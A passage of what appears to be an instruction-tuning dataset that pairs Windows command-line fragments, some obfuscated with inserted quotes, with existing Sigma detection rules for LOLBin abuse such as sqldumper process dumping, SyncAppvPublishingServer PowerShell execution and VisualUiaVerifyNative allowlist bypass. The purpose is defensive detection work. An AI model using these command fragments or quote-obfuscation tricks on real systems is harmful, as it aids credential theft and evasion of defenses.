the rule.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "-i /install -a /add-driver .inf \\pnputil.exe", "output": "title: Suspicious Driver Install by pnputil.exe\nid: a2ea3ae7-d3d0-40a0-a55c-25a45c87cac1\nstatus: test\ndescription: Detects when a possible suspicious driver is being installed via pnputil.exe lolbin\nreferences:\n    - https://learn.microsoft.com/en-us/windows-hardware/drivers/devtest/pnputil-command-syntax\n    - https://strontic.github.io/xcyclopedia/library/pnputil.exe-60EDC5E6BDBAEE441F2E3AEACD0340D2.html\nauthor: Hai Vaknin @LuxNoBulIshit, Avihay eldad  @aloneliassaf, Austin Songer @austinsonger\ndate: 2021-09-30\nmodified: 2022-10-09\ntags:\n    - attack.persistence\n    - attack.t1547\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - '-i'\n            - '/install'\n            - '-a'\n            - '/add-driver'\n            - '.inf'\n        Image|endswith: '\\pnputil.exe'\n    condition: selection\nfields:\n    - ComputerName\n    - User\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Pnputil.exe being used may be performed by a system administrator.\n    - Verify whether the user identity, user agent, and/or hostname should be making changes in your environment.\n    - Pnputil.exe being executed from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "grpconv.exe -o grpconv -o", "output": "title: Suspicious GrpConv Execution\nid: f14e169e-9978-4c69-acb3-1cff8200bc36\nstatus: test\ndescription: Detects the suspicious execution of a utility to convert Windows 3.x .grp files or for persistence purposes by malicious software or actors\nreferences:\n    - https://twitter.com/0gtweet/status/1526833181831200770\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-05-19\ntags:\n    - attack.persistence\n    - attack.t1547\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'grpconv.exe -o'\n            - 'grpconv -o'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "grpconv.exe \\\"-o\\\" \\\"grpconv\\\" -o", "output": "title: Suspicious GrpConv Execution\nid: f14e169e-9978-4c69-acb3-1cff8200bc36\nstatus: test\ndescription: Detects the suspicious execution of a utility to convert Windows 3.x .grp files or for persistence purposes by malicious software or actors\nreferences:\n    - https://twitter.com/0gtweet/status/1526833181831200770\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-05-19\ntags:\n    - attack.persistence\n    - attack.t1547\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'grpconv.exe -o'\n            - 'grpconv -o'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "grpconv -o grpconv -o", "output": "title: Suspicious GrpConv Execution\nid: f14e169e-9978-4c69-acb3-1cff8200bc36\nstatus: test\ndescription: Detects the suspicious execution of a utility to convert Windows 3.x .grp files or for persistence purposes by malicious software or actors\nreferences:\n    - https://twitter.com/0gtweet/status/1526833181831200770\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-05-19\ntags:\n    - attack.persistence\n    - attack.t1547\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'grpconv.exe -o'\n            - 'grpconv -o'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "grpconv.exe -o -o grpconv", "output": "title: Suspicious GrpConv Execution\nid: f14e169e-9978-4c69-acb3-1cff8200bc36\nstatus: test\ndescription: Detects the suspicious execution of a utility to convert Windows 3.x .grp files or for persistence purposes by malicious software or actors\nreferences:\n    - https://twitter.com/0gtweet/status/1526833181831200770\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-05-19\ntags:\n    - attack.persistence\n    - attack.t1547\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'grpconv.exe -o'\n            - 'grpconv -o'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sqldumper.exe 0x0110 0x01100:40", "output": "title: Dumping Process via Sqldumper.exe\nid: 23ceaf5c-b6f1-4a32-8559-f2ff734be516\nstatus: test\ndescription: Detects process dump via legitimate sqldumper.exe binary\nreferences:\n    - https://twitter.com/countuponsec/status/910977826853068800\n    - https://twitter.com/countuponsec/status/910969424215232518\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Sqldumper/\nauthor: Kirill Kiryanov, oscd.community\ndate: 2020-10-08\nmodified: 2021-11-27\ntags:\n    - attack.credential-access\n    - attack.t1003.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\sqldumper.exe'\n        CommandLine|contains:\n            - '0x0110'\n            - '0x01100:40'\n    condition: selection\nfalsepositives:\n    - Legitimate MSSQL Server actions\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sqldumper.exe 0x0110 0x011\\\"00:40\\\"", "output": "title: Dumping Process via Sqldumper.exe\nid: 23ceaf5c-b6f1-4a32-8559-f2ff734be516\nstatus: test\ndescription: Detects process dump via legitimate sqldumper.exe binary\nreferences:\n    - https://twitter.com/countuponsec/status/910977826853068800\n    - https://twitter.com/countuponsec/status/910969424215232518\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Sqldumper/\nauthor: Kirill Kiryanov, oscd.community\ndate: 2020-10-08\nmodified: 2021-11-27\ntags:\n    - attack.credential-access\n    - attack.t1003.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\sqldumper.exe'\n        CommandLine|contains:\n            - '0x0110'\n            - '0x01100:40'\n    condition: selection\nfalsepositives:\n    - Legitimate MSSQL Server actions\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sqldumper 0x0110 0x01100:40", "output": "title: Dumping Process via Sqldumper.exe\nid: 23ceaf5c-b6f1-4a32-8559-f2ff734be516\nstatus: test\ndescription: Detects process dump via legitimate sqldumper.exe binary\nreferences:\n    - https://twitter.com/countuponsec/status/910977826853068800\n    - https://twitter.com/countuponsec/status/910969424215232518\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Sqldumper/\nauthor: Kirill Kiryanov, oscd.community\ndate: 2020-10-08\nmodified: 2021-11-27\ntags:\n    - attack.credential-access\n    - attack.t1003.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\sqldumper.exe'\n        CommandLine|contains:\n            - '0x0110'\n            - '0x01100:40'\n    condition: selection\nfalsepositives:\n    - Legitimate MSSQL Server actions\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sqldumper.exe 0x0110 0x01100:40", "output": "title: Dumping Process via Sqldumper.exe\nid: 23ceaf5c-b6f1-4a32-8559-f2ff734be516\nstatus: test\ndescription: Detects process dump via legitimate sqldumper.exe binary\nreferences:\n    - https://twitter.com/countuponsec/status/910977826853068800\n    - https://twitter.com/countuponsec/status/910969424215232518\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Sqldumper/\nauthor: Kirill Kiryanov, oscd.community\ndate: 2020-10-08\nmodified: 2021-11-27\ntags:\n    - attack.credential-access\n    - attack.t1003.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\sqldumper.exe'\n        CommandLine|contains:\n            - '0x0110'\n            - '0x01100:40'\n    condition: selection\nfalsepositives:\n    - Legitimate MSSQL Server actions\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\SyncAppvPublishingServer.vbs ;", "output": "title: SyncAppvPublishingServer VBS Execute Arbitrary PowerShell Code\nid: 36475a7d-0f6d-4dce-9b01-6aeb473bbaf1\nstatus: test\ndescription: Executes arbitrary PowerShell code using SyncAppvPublishingServer.vbs\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1216/T1216.md\n    - https://lolbas-project.github.io/lolbas/Binaries/Syncappvpublishingserver/\nauthor: frack113\ndate: 2021-07-16\nmodified: 2022-06-22\ntags:\n    - attack.defense-evasion\n    - attack.t1218\n    - attack.t1216\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - '\\SyncAppvPublishingServer.vbs'\n            - ';'  # at a minimum, a semi-colon is required\n    condition: selection\nfields:\n    - ComputerName\n    - User\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\SyncAppvPublishingServer.vbs \";\"", "output": "title: SyncAppvPublishingServer VBS Execute Arbitrary PowerShell Code\nid: 36475a7d-0f6d-4dce-9b01-6aeb473bbaf1\nstatus: test\ndescription: Executes arbitrary PowerShell code using SyncAppvPublishingServer.vbs\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1216/T1216.md\n    - https://lolbas-project.github.io/lolbas/Binaries/Syncappvpublishingserver/\nauthor: frack113\ndate: 2021-07-16\nmodified: 2022-06-22\ntags:\n    - attack.defense-evasion\n    - attack.t1218\n    - attack.t1216\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - '\\SyncAppvPublishingServer.vbs'\n            - ';'  # at a minimum, a semi-colon is required\n    condition: selection\nfields:\n    - ComputerName\n    - User\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\SyncAppvPublishingServer ;", "output": "title: SyncAppvPublishingServer VBS Execute Arbitrary PowerShell Code\nid: 36475a7d-0f6d-4dce-9b01-6aeb473bbaf1\nstatus: test\ndescription: Executes arbitrary PowerShell code using SyncAppvPublishingServer.vbs\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1216/T1216.md\n    - https://lolbas-project.github.io/lolbas/Binaries/Syncappvpublishingserver/\nauthor: frack113\ndate: 2021-07-16\nmodified: 2022-06-22\ntags:\n    - attack.defense-evasion\n    - attack.t1218\n    - attack.t1216\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - '\\SyncAppvPublishingServer.vbs'\n            - ';'  # at a minimum, a semi-colon is required\n    condition: selection\nfields:\n    - ComputerName\n    - User\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\SyncAppvPublishingServer.vbs ;", "output": "title: SyncAppvPublishingServer VBS Execute Arbitrary PowerShell Code\nid: 36475a7d-0f6d-4dce-9b01-6aeb473bbaf1\nstatus: test\ndescription: Executes arbitrary PowerShell code using SyncAppvPublishingServer.vbs\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1216/T1216.md\n    - https://lolbas-project.github.io/lolbas/Binaries/Syncappvpublishingserver/\nauthor: frack113\ndate: 2021-07-16\nmodified: 2022-06-22\ntags:\n    - attack.defense-evasion\n    - attack.t1218\n    - attack.t1216\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - '\\SyncAppvPublishingServer.vbs'\n            - ';'  # at a minimum, a semi-colon is required\n    condition: selection\nfields:\n    - ComputerName\n    - User\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "ttdinject.exe TTDInject.EXE", "output": "title: Use of TTDInject.exe\nid: b27077d6-23e6-45d2-81a0-e2b356eea5fd\nstatus: test\ndescription: Detects the executiob of TTDInject.exe, which is used by Windows 10 v1809 and newer to debug time travel (underlying call of tttracer.exe)\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Ttdinject/\nauthor: frack113\ndate: 2022-05-16\ntags:\n    - attack.defense-evasion\n    - attack.t1127\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        - Image|endswith: 'ttdinject.exe'\n        - OriginalFileName: 'TTDInject.EXE'\n    condition: selection\nfalsepositives:\n    - Legitimate use\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "ttdinject.exe \\\"TTDInject.EXE\\\"", "output": "title: Use of TTDInject.exe\nid: b27077d6-23e6-45d2-81a0-e2b356eea5fd\nstatus: test\ndescription: Detects the executiob of TTDInject.exe, which is used by Windows 10 v1809 and newer to debug time travel (underlying call of tttracer.exe)\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Ttdinject/\nauthor: frack113\ndate: 2022-05-16\ntags:\n    - attack.defense-evasion\n    - attack.t1127\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        - Image|endswith: 'ttdinject.exe'\n        - OriginalFileName: 'TTDInject.EXE'\n    condition: selection\nfalsepositives:\n    - Legitimate use\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "ttdinject TTDInject", "output": "title: Use of TTDInject.exe\nid: b27077d6-23e6-45d2-81a0-e2b356eea5fd\nstatus: test\ndescription: Detects the executiob of TTDInject.exe, which is used by Windows 10 v1809 and newer to debug time travel (underlying call of tttracer.exe)\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Ttdinject/\nauthor: frack113\ndate: 2022-05-16\ntags:\n    - attack.defense-evasion\n    - attack.t1127\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        - Image|endswith: 'ttdinject.exe'\n        - OriginalFileName: 'TTDInject.EXE'\n    condition: selection\nfalsepositives:\n    - Legitimate use\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "ttdinject.exe TTDInject.EXE", "output": "title: Use of TTDInject.exe\nid: b27077d6-23e6-45d2-81a0-e2b356eea5fd\nstatus: test\ndescription: Detects the executiob of TTDInject.exe, which is used by Windows 10 v1809 and newer to debug time travel (underlying call of tttracer.exe)\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Ttdinject/\nauthor: frack113\ndate: 2022-05-16\ntags:\n    - attack.defense-evasion\n    - attack.t1127\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        - Image|endswith: 'ttdinject.exe'\n        - OriginalFileName: 'TTDInject.EXE'\n    condition: selection\nfalsepositives:\n    - Legitimate use\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\unregmp2.exe unregmp2.exe /HideWMP", "output": "title: Lolbin Unregmp2.exe Use As Proxy\nid: 727454c0-d851-48b0-8b89-385611ab0704\nstatus: test\ndescription: Detect usage of the \"unregmp2.exe\" binary as a proxy to launch a custom version of \"wmpnscfg.exe\"\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Unregmp2/\nauthor: frack113\ndate: 2022-12-29\nmodified: 2024-06-04\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\unregmp2.exe'\n        - OriginalFileName: 'unregmp2.exe'\n    selection_cmd:\n        CommandLine|contains|windash: ' /HideWMP'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\unregmp2.exe \"u\"\"n\"\"r\"\"e\"\"g\"\"m\"\"p\"\"2\"\".\"\"e\"\"x\"\"e\" /HideWMP", "output": "title: Lolbin Unregmp2.exe Use As Proxy\nid: 727454c0-d851-48b0-8b89-385611ab0704\nstatus: test\ndescription: Detect usage of the \"unregmp2.exe\" binary as a proxy to launch a custom version of \"wmpnscfg.exe\"\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Unregmp2/\nauthor: frack113\ndate: 2022-12-29\nmodified: 2024-06-04\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\unregmp2.exe'\n        - OriginalFileName: 'unregmp2.exe'\n    selection_cmd:\n        CommandLine|contains|windash: ' /HideWMP'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\unregmp2 unregmp2 /HideWMP", "output": "title: Lolbin Unregmp2.exe Use As Proxy\nid: 727454c0-d851-48b0-8b89-385611ab0704\nstatus: test\ndescription: Detect usage of the \"unregmp2.exe\" binary as a proxy to launch a custom version of \"wmpnscfg.exe\"\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Unregmp2/\nauthor: frack113\ndate: 2022-12-29\nmodified: 2024-06-04\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\unregmp2.exe'\n        - OriginalFileName: 'unregmp2.exe'\n    selection_cmd:\n        CommandLine|contains|windash: ' /HideWMP'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\unregmp2.exe unregmp2.exe /HideWMP", "output": "title: Lolbin Unregmp2.exe Use As Proxy\nid: 727454c0-d851-48b0-8b89-385611ab0704\nstatus: test\ndescription: Detect usage of the \"unregmp2.exe\" binary as a proxy to launch a custom version of \"wmpnscfg.exe\"\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Unregmp2/\nauthor: frack113\ndate: 2022-12-29\nmodified: 2024-06-04\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\unregmp2.exe'\n        - OriginalFileName: 'unregmp2.exe'\n    selection_cmd:\n        CommandLine|contains|windash: ' /HideWMP'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "UtilityFunctions.ps1 RegSnapin", "output": "title: UtilityFunctions.ps1 Proxy Dll\nid: 0403d67d-6227-4ea8-8145-4e72db7da120\nstatus: test\ndescription: Detects the use of a Microsoft signed script executing a managed DLL with PowerShell.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Scripts/UtilityFunctions/\nauthor: frack113\ndate: 2022-05-28\ntags:\n    - attack.defense-evasion\n    - attack.t1216\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'UtilityFunctions.ps1'\n            - 'RegSnapin '\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "UtilityFunctions.ps1 RegS\"napin\"", "output": "title: UtilityFunctions.ps1 Proxy Dll\nid: 0403d67d-6227-4ea8-8145-4e72db7da120\nstatus: test\ndescription: Detects the use of a Microsoft signed script executing a managed DLL with PowerShell.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Scripts/UtilityFunctions/\nauthor: frack113\ndate: 2022-05-28\ntags:\n    - attack.defense-evasion\n    - attack.t1216\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'UtilityFunctions.ps1'\n            - 'RegSnapin '\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "UtilityFunctions RegSnapin", "output": "title: UtilityFunctions.ps1 Proxy Dll\nid: 0403d67d-6227-4ea8-8145-4e72db7da120\nstatus: test\ndescription: Detects the use of a Microsoft signed script executing a managed DLL with PowerShell.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Scripts/UtilityFunctions/\nauthor: frack113\ndate: 2022-05-28\ntags:\n    - attack.defense-evasion\n    - attack.t1216\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'UtilityFunctions.ps1'\n            - 'RegSnapin '\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "UtilityFunctions.ps1 RegSnapin", "output": "title: UtilityFunctions.ps1 Proxy Dll\nid: 0403d67d-6227-4ea8-8145-4e72db7da120\nstatus: test\ndescription: Detects the use of a Microsoft signed script executing a managed DLL with PowerShell.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Scripts/UtilityFunctions/\nauthor: frack113\ndate: 2022-05-28\ntags:\n    - attack.defense-evasion\n    - attack.t1216\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'UtilityFunctions.ps1'\n            - 'RegSnapin '\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\VisualUiaVerifyNative.exe VisualUiaVerifyNative.exe", "output": "title: Use of VisualUiaVerifyNative.exe\nid: b30a8bc5-e21b-4ca2-9420-0a94019ac56a\nstatus: test\ndescription: VisualUiaVerifyNative.exe is a Windows SDK that can be used for AWL bypass and is listed in Microsoft's recommended block rules.\nreferences:\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/VisualUiaVerifyNative/\n    - https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/design/applications-that-can-bypass-wdac\n    - https://bohops.com/2020/10/15/exploring-the-wdac-microsoft-recommended-block-rules-visualuiaverifynative/\n    - https://github.com/MicrosoftDocs/windows-itpro-docs/commit/937db704b9148e9cee7c7010cad4d00ce9c4fdad\nauthor: 'Christopher Peacock @SecurePeacock, SCYTHE @scythe_io'\ndate: 2022-06-01\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\VisualUiaVerifyNative.exe'\n        - OriginalFileName: 'VisualUiaVerifyNative.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate testing of Microsoft UI parts.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\VisualUiaVerifyNative.exe \\\"VisualUiaVer\\\"ifyNative.exe", "output": "title: Use of VisualUiaVerifyNative.exe\nid: b30a8bc5-e21b-4ca2-9420-0a94019ac56a\nstatus: test\ndescription: VisualUiaVerifyNative.exe is a Windows SDK that can be used for AWL bypass and is listed in Microsoft's recommended block rules.\nreferences:\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/VisualUiaVerifyNative/\n    - https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/design/applications-that-can-bypass-wdac\n    - https://bohops.com/2020/10/15/exploring-the-wdac-microsoft-recommended-block-rules-visualuiaverifynative/\n    - https://github.com/MicrosoftDocs/windows-itpro-docs/commit/937db704b9148e9cee7c7010cad4d00ce9c4fdad\nauthor: 'Christopher Peacock @SecurePeacock, SCYTHE @scythe_io'\ndate: 2022-06-01\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\VisualUiaVerifyNative.exe'\n        - OriginalFileName: 'VisualUiaVerifyNative.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate testing of Microsoft UI parts.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\VisualUiaVerifyNative VisualUiaVerifyNative", "output": "title: Use of VisualUiaVerifyNative.exe\nid: b30a8bc5-e21b-4ca2-9420-0a94019ac56a\nstatus: test\ndescription: VisualUiaVerifyNative.exe is a Windows SDK that can be used for AWL bypass and is listed in Microsoft's recommended block rules.\nreferences:\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/VisualUiaVerifyNative/\n    - https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/design/applications-that-can-bypass-wdac\n    - https://bohops.com/2020/10/15/exploring-the-wdac-microsoft-recommended-block-rules-visualuiaverifynative/\n    - https://github.com/MicrosoftDocs/windows-itpro-docs/commit/937db704b9148e9cee7c7010cad4d00ce9c4fdad\nauthor: 'Christopher Peacock @SecurePeacock, SCYTHE @scythe_io'\ndate: 2022-06-01\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\VisualUiaVerifyNative.exe'\n        - OriginalFileName: 'VisualUiaVerifyNative.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate testing of Microsoft UI parts.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\VisualUiaVerifyNative.exe VisualUiaVerifyNative.exe", "output": "title: Use of VisualUiaVerifyNative.exe\nid: b30a8bc5-e21b-4ca2-9420-0a94019ac56a\nstatus: test\ndescription: VisualUiaVerifyNative.exe is a Windows SDK that can be used for AWL bypass and is listed in Microsoft's recommended block rules.\nreferences:\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/VisualUiaVerifyNative/\n    - https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/design/applications-that-can-bypass-wdac\n    - https://bohops.com/2020/10/15/exploring-the-wdac-microsoft-recommended-block-rules-visualuiaverifynative/\n    - https://github.com/MicrosoftDocs/windows-itpro-docs/commit/937db704b9148e9cee7c7010cad4d00ce9c4fdad\nauthor: 'Christopher Peacock @SecurePeacock, SCYTHE @scythe_io'\ndate: 2022-06-01\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\VisualUiaVerifyNative.exe'\n        - OriginalFileName: 'VisualUiaVerifyNative.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate testing of Microsoft UI parts.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\vbc.exe \\cvtres.exe", "output": "title: Visual Basic Command Line Compiler Usage\nid: 7b10f171-7f04-47c7-9fa2-5be43c76e535\nstatus: test\ndescription: Detects successful code compilation via Visual Basic Command Line Compiler that utilizes Windows Resource to Object Converter.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Vbc/\nauthor: 'Ensar Şamil, @sblmsrsn, @oscd_initiative'\ndate: 2020-10-07\nmodified: 2021-11-27\ntags:\n    - attack.defense-evasion\n    - attack.t1027.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\vbc.exe'\n        Image|endswith: '\\cvtres.exe'\n    condition: selection\nfalsepositives:\n    - Utilization of this tool should not be seen in enterprise environment\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\vbc.exe \"\\\"\"c\"\"v\"\"t\"\"r\"\"e\"\"s\"\".\"\"e\"\"x\"\"e\"", "output": "title: Visual Basic Command Line Compiler Usage\nid: 7b10f171-7f04-47c7-9fa2-5be43c76e535\nstatus: test\ndescription: Detects successful code compilation via Visual Basic Command Line Compiler that utilizes Windows Resource to Object Converter.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Vbc/\nauthor: 'Ensar Şamil, @sblmsrsn, @oscd_initiative'\ndate: 2020-10-07\nmodified: 2021-11-27\ntags:\n    - attack.defense-evasion\n    - attack.t1027.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\vbc.exe'\n        Image|endswith: '\\cvtres.exe'\n    condition: selection\nfalsepositives:\n    - Utilization of this tool should not be seen in enterprise environment\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\vbc \\cvtres", "output": "title: Visual Basic Command Line Compiler Usage\nid: 7b10f171-7f04-47c7-9fa2-5be43c76e535\nstatus: test\ndescription: Detects successful code compilation via Visual Basic Command Line Compiler that utilizes Windows Resource to Object Converter.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Vbc/\nauthor: 'Ensar Şamil, @sblmsrsn, @oscd_initiative'\ndate: 2020-10-07\nmodified: 2021-11-27\ntags:\n    - attack.defense-evasion\n    - attack.t1027.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\vbc.exe'\n        Image|endswith: '\\cvtres.exe'\n    condition: selection\nfalsepositives:\n    - Utilization of this tool should not be seen in enterprise environment\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\vbc.exe \\cvtres.exe", "output": "title: Visual Basic Command Line Compiler Usage\nid: 7b10f171-7f04-47c7-9fa2-5be43c76e535\nstatus: test\ndescription: Detects successful code compilation via Visual Basic Command Line Compiler that utilizes Windows Resource to Object Converter.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Vbc/\nauthor: 'Ensar Şamil, @sblmsrsn, @oscd_initiative'\ndate: 2020-10-07\nmodified: 2021-11-27\ntags:\n    - attack.defense-evasion\n    - attack.t1027.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\vbc.exe'\n        Image|endswith: '\\cvtres.exe'\n    condition: selection\nfalsepositives:\n    - Utilization of this tool should not be seen in enterprise environment\nlevel: high"}
